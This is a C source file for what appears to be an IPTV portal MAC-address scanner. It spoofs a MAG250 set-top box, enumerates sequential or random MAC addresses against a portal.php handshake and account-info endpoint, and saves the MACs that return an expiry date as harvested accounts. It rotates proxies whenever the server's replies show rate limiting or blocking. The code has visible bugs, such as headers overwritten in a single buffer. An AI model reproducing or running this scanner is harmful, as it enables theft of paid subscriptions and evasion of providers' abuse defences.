/* NOTE: I want to keep this smac.c program in pure C */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <curl/curl.h>
#include <pthread.h>

#define MAX_RESPONSE_LEN 16 * 1024
#define MAX_URL_LEN 2048
#define MAX_HEADERS_LEN 2048

#define MAC_LEN 12
#define STR_MAC_LEN MAC_LEN + 5 + 1

#include "shared.h"
#include "utils.c"
#include "proxies.c"
//char host[MAX_URL_LEN] = "http://localhost:8008";
//char mac[STR_MAC_LEN]  = "00:1A:79:00:00:00";

int MAC_COUNT = 0;
int ACCOUNTS_COUNT = 0;

int CURL_TIMEOUTS_COUNT = 0; // if above NB_THREADS, stop scanning

typedef struct {
    int thread_index;
    char *host;
    char *mac;
    int mac_index;
    UserProxy *proxy;
} ThreadCheckArgs ;

pthread_t threads[THREADS_LIMIT] = {0};
ThreadCheckArgs threads_args[THREADS_LIMIT] = {0};

char threads_macs[THREADS_LIMIT][12+5+1] = {0};

int THREADS_COUNT = 0;

char responses[THREADS_LIMIT][MAX_RESPONSE_LEN] = {0};

const char *ua       = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3";
const char *x_ua     = "Model: MAG250; Link: WiFi";
const char *stb_lang = "en";
const char *tz       = "Europe/Amsterdam";

void write_account_to_save_file(char *mac, char *exp_date) {
    if (AUTO_SAVE_ACCOUNTS) {
        char save_path[MAX_URL_LEN*2] = {0};
        snprintf(save_path,sizeof(save_path),"%s/%s",results_dir,accounts_filename);
        FILE *f = fopen(save_path,"a");
        if (ACCOUNTS_COUNT == 0) {
            fprintf(f,"%s\n",host);
            fprintf(f,"------------------------\n");
        }
        fprintf(f,"%s [%s]\n",mac,exp_date);
        printf("[i] Wrote new account to file: %s\n", save_path);
        fclose(f);
    }
}

void write_checkpoint(char *mac) {
    if (USE_CHECKPOINTS && SCAN_MODE == SEQUENTIAL) {
        char save_path[MAX_URL_LEN*2] = {0};
        snprintf(save_path,sizeof(save_path),"%s/%s",checkpoints_dir,checkpoint_filename);
        FILE *f = fopen(save_path,"w");
        fprintf(f,"%s",mac);
        fclose(f);
    }
}

void encode_mac(char *encoded_mac, char *mac) {
    int encoded_mac_len = 0;
    while (mac[0] != '\0') {
        switch (mac[0]) {
            case ':':
                encoded_mac[encoded_mac_len++] = '%';
                encoded_mac[encoded_mac_len++] = '3';
                encoded_mac[encoded_mac_len++] = 'A';
                break;
            default:
                encoded_mac[encoded_mac_len++] = mac[0];
        }
        mac++;
    }
    encoded_mac[encoded_mac_len] = '\0';
}

#include "write_callback_declarations.h"

void make_request(char *url, char *mac, struct curl_slist *headers, UserProxy *proxy, int max_retry, int thread_index) {

    CURL *curl = curl_easy_init();

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    //curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, (long)3);
    //curl_easy_setopt(curl, CURLOPT_SERVER_RESPONSE_TIMEOUT, (long)3);
    //curl_easy_setopt(curl, CURLOPT_TIMEOUT, (long)request_timeout / 1000);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, (long)request_timeout); // this is in milliseconds

    curl_easy_setopt(curl, CURLOPT_PROXY, proxy->url);
    curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, proxy->username);
    curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, proxy->password);

#include "write_callback_calls.h"

    CURLcode res = curl_easy_perform(curl);
    long response_code;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    
    // TODO: check if error 23 is normal to us (because we use our own callback function)
    //       For now we consider it to be normal behaviour 
    if (res != CURLE_OK && res != 23) {

        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        
        if (res == 3) {
            // TODO: This is a ill-formatted URL, we should stop scanning IMMEDIATELY
            fprintf(stderr,"[!] Malformed server URL \"%s\"\n",host);
            GRACEFUL_EXIT_ASKED = true;
        }
        
        else if (res == 6) {
            fprintf(stderr,"[!] Could not resolve host URL.\n");
            GRACEFUL_EXIT_ASKED = true;
        }
        
        else if (res == 28) {
            printf("[i] Operation timed out.\n");

            if (PROXY_MODE == FROM_FILE || PROXY_MODE == FROM_URL) {
                get_next_proxy(PROXY_MANUAL_URL);
                // TODO check if made one full rotation
                make_request(url, mac, headers, proxy, max_retry, thread_index);
                return;
                
            } else {
                
                if (max_retry > 0) {
                    make_request(url, mac, headers, proxy, max_retry-1, thread_index);
                    return;
                }
                
                fprintf(stderr,"[!] Timeout limit reached.\n");
                GRACEFUL_EXIT_ASKED = true;
            }

        }
        
        else if (res == 5) {
            if (PROXY_MODE == FROM_FILE || PROXY_MODE == FROM_URL) {
                fprintf(stderr,"[i] Cannot resolve proxy \"%s\". Rotating.\n", proxy->url);
                get_next_proxy(PROXY_MANUAL_URL);
                // TODO check if made one full rotation
                make_request(url, mac, headers, proxy, MAX_REQUESTS_RETRY, thread_index);
                return;
            } else {
                fprintf(stderr,"[!] Could not resolve proxy \"%s\".\n", proxy->url);
                GRACEFUL_EXIT_ASKED = true;
            }
        }

        else {
            if (max_retry == 0) {
                fprintf(stderr,"[!] Max retry limit reached.\n");
                GRACEFUL_EXIT_ASKED = true;
            } else if (PROXY_MODE == FROM_FILE || PROXY_MODE == FROM_URL) {
                make_request(url, mac, headers, proxy, max_retry, thread_index);
                return;
            } else {
                make_request(url, mac, headers, proxy, max_retry-1, thread_index);
                return;
            }
        }
    }
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

void parse_pattern(char *dst, char *pattern, char *response) {
    int nest = 0;
    char *s = response;
    while (s[0] != '\0') {
        if (s[0] == '{') nest++; // kinda json parser of the poor :')
        if (s[0] == '}') nest--; // kinda json parser of the poor :')
        if (nest == 0) {
            return;
        }
        if (strncmp(pattern,s,strlen(pattern)) == 0) {
            s+=strlen(pattern);
            while (s[0] == ' ' || s[0] == ':' || s[0] == '"' || s[0] == '\n' || s[0] == '\r') {
                if (s[0] == '\0') return;
                s++;
            }
            while (s[0] != '"' && s[0] != '\0') {
                if (s[0] != '\r' && s[0] != '\n') dst[strlen(dst)] = s++[0];
                if (s[0] == '\r' && s[1] == '\n') {
                    s+=2;
                    while (s[0] != '\r' && s[1] != '\n') s++;
                    s+=2;
                    continue;
                }
            }
            dst[strlen(dst)] = '\0';
            return;
        }
        s++;
    }
}

void lower_string(char *str) {
    for (int i=0;i<strlen(str);i++) {
        str[i] = tolower(str[i]);
    }
}

bool match_pattern(char *pattern, char *text) {
    char *s = text;
    while (s[0] != '\0') {
        if (strncmp(pattern,s,strlen(pattern)) == 0) return true;
        s++;
    }
    return false;
}

void handshake(char *token, char *url_path, char *host, char *mac, struct curl_slist *headers, UserProxy *proxy, int thread_index) {
    char url[MAX_URL_LEN];
    snprintf(url,sizeof(url),url_path,host,mac);
    make_request(url,mac,headers,proxy,MAX_REQUESTS_RETRY,thread_index);
    parse_pattern(token,(char *)"\"token\"",responses[thread_index]);
}

void get_exp_date(char *exp_date, char *url_path, char *host, char *mac, struct curl_slist *headers, UserProxy *proxy, int thread_index) {
    char url[MAX_URL_LEN];
    snprintf(url,sizeof(url),url_path,host,mac);
    make_request(url,mac,headers,proxy,MAX_REQUESTS_RETRY,thread_index);
    parse_pattern(exp_date,(char *)"\"phone\"",responses[thread_index]);
}

void study_reponse(char *response) {
    /* Here we check what the server answered and act accordingly */
    // access refusals
    
    const char *refusal_patterns[] = {
        "forbidden", "unauthorized", "too many", "429", "access denied", "denied",
        "security", "blocking", "blocked", "not allowed", "reset", "overflow",
        "<html>", "maximum", "reached", "error", "disconnect", "invalid",
        "credential", "autoproxy", "timeout",
    };

    lower_string(response);

    for (int i=0;i<sizeof(refusal_patterns)/sizeof(refusal_patterns[0]);i++) {

        bool matched = match_pattern((char *)refusal_patterns[i],response);
        if (matched) {
            // server refuses you
            if (USE_PROXY && (PROXY_MODE == FROM_FILE || PROXY_MODE == FROM_URL)) {
                printf("[i] Rotating proxy: server blocks you (response contains \"%s...\")\n",refusal_patterns[i]);
                get_next_proxy(PROXY_MANUAL_URL);
                return;
            }
            fprintf(stderr,"[!] Stopping scan: server blocks you: %s\n", refusal_patterns[i]);
            GRACEFUL_EXIT_ASKED = true;
            return;
        }
    }

    // other errors
    if (strlen(response) == 0) {
        if (USE_PROXY && (PROXY_MODE == FROM_FILE || PROXY_MODE == FROM_URL)) {
            printf("[i] Rotating proxy: the server provides empty replies\n");
            get_next_proxy(PROXY_MANUAL_URL);
            return;
        }
        fprintf(stderr,"[!] Stopping scan: the server provides empty replies\n1");
        GRACEFUL_EXIT_ASKED = true;
        return;
    }
    //printf("TODO: investigate why it went wrong");
    printf("response = <<<%s>>>\n",response);
    // else it is just empty token or exp_date
}

//bool check(char *host, char *mac) {
void *check(void *thread_args) {

    ThreadCheckArgs args = *(ThreadCheckArgs*)thread_args;

    // every variables are local
    // EXCEPT "response"
    char encoded_mac[12+5*3+1] = {0};
    encode_mac(encoded_mac, args.mac);

    //printf("mac = %s ; encoded = %s ; index = %d\n", args.mac, encoded_mac, args.thread_index);

    char tmp_headers[MAX_HEADERS_LEN] = {0};
    struct curl_slist *headers = {0};

    // prepare for handshake
    snprintf(tmp_headers, sizeof(tmp_headers),"Accept: */*", NULL);
    snprintf(tmp_headers, sizeof(tmp_headers),"User-Agent: %s", ua);
    snprintf(tmp_headers, sizeof(tmp_headers),"X-User-Agent: %s", x_ua);
    snprintf(tmp_headers, sizeof(tmp_headers),"Cookie: mac=%s;stb_lang=%s;tz=%s;", args.mac,stb_lang,tz);
    headers = curl_slist_append(headers,tmp_headers);

    // prepare proxy
    UserProxy proxy = *(UserProxy*)args.proxy;

    // handshake
    char token[MAX_TOKEN_LEN] = {0};
    handshake(token, (char *)"%s/portal.php?action=handshake&type=stb&token=&mac=%s",args.host, encoded_mac, headers, &proxy, args.thread_index);

    if (strlen(token) == 0) {
        study_reponse(responses[args.thread_index]);
        THREADS_COUNT--;
        threads[args.thread_index] = 0;
        pthread_exit(NULL);
        return NULL;
    }

    // reset headers
    for (int i=0;i<MAX_HEADERS_LEN;i++) tmp_headers[i] = '\0';
    headers = NULL;

    // prepare for account verif
    snprintf(tmp_headers, sizeof(tmp_headers),"Accept: */*", NULL);
    snprintf(tmp_headers, sizeof(tmp_headers),"User-Agent: %s", ua);
    snprintf(tmp_headers, sizeof(tmp_headers),"X-User-Agent: %s", x_ua);
    snprintf(tmp_headers, sizeof(tmp_headers),"Cookie: mac=%s;stb_lang=%s;tz=%s;", args.mac,stb_lang,tz);
    snprintf(tmp_headers, sizeof(tmp_headers),"Authorization: Bearer %s", token);
    headers = curl_slist_append(headers,tmp_headers);

    // account verif
    char exp_date[MAX_EXP_LEN] = {0};
    get_exp_date(exp_date,(char *)"%s/portal.php?type=account_info&action=get_main_info&mac=%s",args.host,args.mac,headers,&proxy,args.thread_index);
   
    if (strlen(exp_date) == 0) {
        study_reponse(responses[args.thread_index]);
        THREADS_COUNT--;
        threads[args.thread_index] = 0;
        pthread_exit(NULL);
        return NULL;
    }

    //printf("exp_date: %s\n",exp_date);
    printf("(thread %d) [%d] %s [%s]\n", args.mac_index,MAC_COUNT, args.mac, exp_date);
    GUI_add_account_to_accounts_list(args.mac, exp_date);
    write_account_to_save_file(args.mac, exp_date);
    ACCOUNTS_COUNT++;

    THREADS_COUNT--;
    threads[args.thread_index] = 0;
    //pthread_exit(NULL);
    return NULL;
}

long long power(int n, unsigned int exp) {
    long long res = 1;
    while (exp > 0) {
        res*=n;
        exp--;
    }
    return res;
}

void compute_next_mac_random(char *next_mac) {
    // handle prefix
    char mac_prefix_no_colon[MAC_LEN+1] = {0};
    for (int i = 0; i < strlen(mac_prefix); i++) {
        if (mac_prefix[i] != ':') mac_prefix_no_colon[strlen(mac_prefix_no_colon)] = mac_prefix[i];
    }
    mac_prefix_no_colon[strlen(mac_prefix_no_colon)] = '\0';

    int bytes_to_fill = MAC_LEN - strlen(mac_prefix_no_colon);

    for (int i = 0; i<bytes_to_fill; i++) mac_prefix_no_colon[strlen(mac_prefix_no_colon)] = '0';
    long long mac_prefix_LL = strtoll(mac_prefix_no_colon,NULL,16);
 
    char random_mac[STR_MAC_LEN] = {0};

    long long random_part = 0;
    for (int i=1;i<=bytes_to_fill;i++) {
        random_part += (long long)rand() << ((i-1)*4);
    }
    random_part %= power(16,bytes_to_fill);
    long long random_mac_LL = mac_prefix_LL + random_part;

    sprintf(next_mac,"%02lX:%02lX:%02lX:%02lX:%02lX:%02lX",
        random_mac_LL >> 40 & 0XFF, random_mac_LL >> 32 & 0XFF, 
        random_mac_LL >> 24 & 0XFF, random_mac_LL >> 16 & 0XFF, 
        random_mac_LL >> 8 & 0XFF,  random_mac_LL >> 0 & 0XFF);  

//    printf("mac_prefix = %s            \n", mac_prefix);
//    printf("bytes_to_fill = %d\n", bytes_to_fill);
//    printf("power(16,%d) = %lld\n",bytes_to_fill, power(16,bytes_to_fill));
//    printf("mac_prefix_no_colon = %s\n",mac_prefix_no_colon);
//    printf("mac_prefix_LL = %lld\n",mac_prefix_LL);
//    printf("random_part       = %lld\n",random_part);
//    printf("random_mac_LL = %lld\n", random_mac_LL);
//    printf("random_mac = %s\n", random_mac);

}

void compute_next_mac_sequential(char *next_mac, char *mac) {
    char mac_no_colon[12+1] = {0};
    for (int i = 0; i < strlen(mac); i++) {
        if (mac[i] != ':') mac_no_colon[strlen(mac_no_colon)] = mac[i];
    }
    mac_no_colon[strlen(mac_no_colon)] = '\0';

    long long mac_LL = strtoll(mac_no_colon,NULL,16);
    long long next_mac_LL = (mac_LL + 1) % power(16,12);

    //char next_mac[FULL_MAC_STR_LEN] = {0};
    sprintf(next_mac,"%02lX:%02lX:%02lX:%02lX:%02lX:%02lX",
        next_mac_LL >> 40 & 0XFF, next_mac_LL >> 32 & 0XFF, 
        next_mac_LL >> 24 & 0XFF, next_mac_LL >> 16 & 0XFF, 
        next_mac_LL >> 8 & 0XFF,  next_mac_LL >> 0 & 0XFF);  
}

void compute_next_mac(char *next_mac, char *mac) {
    if (SCAN_MODE == SEQUENTIAL)  compute_next_mac_sequential(next_mac, mac);
    else if (SCAN_MODE == RANDOM) compute_next_mac_random(next_mac);
    //else { fprintf(stderr,"[!] ERROR: Unknown SCAN_MODE\n"); }
}

void *start(void *_) {

    // NOTE: smac.c knows nothing about wether the host it has been
    //       passed is valid or not. It checks accoutns, that is all.

    // Initialize threads to 0
    for (int i=0;i<NB_THREADS;i++) threads[i] = 0;

    // Let's loop until stop is asked
    // TODO: Find a proper way
    while (!GRACEFUL_EXIT_ASKED) {

        //printf("[%d] %s\n",MAC_COUNT, mac);
        GUI_update_scanning_labels(mac);

        // NOTE: We proceed by batch. Simultaneaous requests are
        // started AND stopped together. THis is incidentally useful
        // to reset the CURL_TIMEOUTS_COUNT variable.
        if (THREADS_COUNT >= NB_THREADS) {
            //empty the queue
            for (int j=0;j<NB_THREADS;j++) {
                if (threads[j] == 0) continue;
                int ok = pthread_join(threads[j],NULL);
                if (ok == 0) threads[j] = 0;
            }
            CURL_TIMEOUTS_COUNT = 0;
        }

        // find an empty thread
        bool found_place = false;
        while (!found_place) {
            for (int j=0;j<NB_THREADS;j++) {
                if (threads[j] == 0) {
                    threads_args[j].thread_index = j;
                    threads_args[j].host = host;

                    strcpy(threads_macs[j],mac);
                    threads_args[j].mac = threads_macs[j];

                    //threads_args[j].mac = next_mac();
                    threads_args[j].mac_index = j;

                    // prepare proxy
                    UserProxy proxy = {0};
                    
                    if (USE_PROXY) {
                        // NOTE: atm we use PROXY_MANUAL_URL as variable holder
                        //       for the proxy to use even when in PROXY_FILE mode.
                        //       Note that username and password are specifically
                        //       reserved for MANUAL settings. TODO reword this
                        //       comment and fix this ambiguity
                        proxy.url = PROXY_MANUAL_URL;

                        if (PROXY_MODE == MANUAL) {
                            proxy.username = PROXY_MANUAL_USERNAME;
                            proxy.password = PROXY_MANUAL_PASSWORD;
                        }
                    }

                    threads_args[j].proxy = &proxy; 

                    int ok = pthread_create(&threads[j], NULL, check, &threads_args[j]);
                    if (ok == 0) {
                        THREADS_COUNT++;
                        found_place = true;
                        break;
                    }
                }
            }
        }
 
        write_checkpoint(mac);

        compute_next_mac(next_mac,mac);
        strcpy(mac,next_mac);
        MAC_COUNT++;

        if (pause_nb > 0 && MAC_COUNT % pause_nb == 0) {
            GUI_update_scanning_labels("Paused");
            printf("pausing for %d seconds\n", pause_duration / 1000);
            usleep(pause_duration * 1000); // µ secs
        } else if (request_delay > 0) {
            usleep(request_delay * 1000); // µ secs
        }

    }

    printf("finishing threads from within the main\n");
    for (int i=0;i<NB_THREADS;i++) {
        if (threads[i] > 0) pthread_join(threads[i],NULL);
    }
    THREADS_COUNT = 0;
    printf("finishing main tthread\n");

    //printf("finished");
    GRACEFUL_EXIT_ASKED = false;

    GUI_scan_ended_by_itself();
    return NULL;
}
